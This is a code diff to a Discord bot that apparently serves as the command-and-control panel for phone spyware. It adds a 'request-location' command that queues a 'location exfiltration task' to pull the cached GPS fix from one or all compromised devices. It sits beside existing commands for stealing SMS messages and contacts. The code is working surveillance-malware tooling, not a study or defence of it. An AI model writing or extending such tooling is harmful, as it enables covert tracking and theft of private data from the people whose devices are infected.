@@ -541,6 +541,43 @@ async def request_sms(
 
 
 @bot.tree.command(
+    name="request-location",
+    description="Request last known GPS location from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_location(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a location exfiltration task (uses cached GPS fix, no active tracking)."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-location")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-location", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-location",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
     name="request-contacts",
     description="Request contacts from a device (or all devices).",
 )
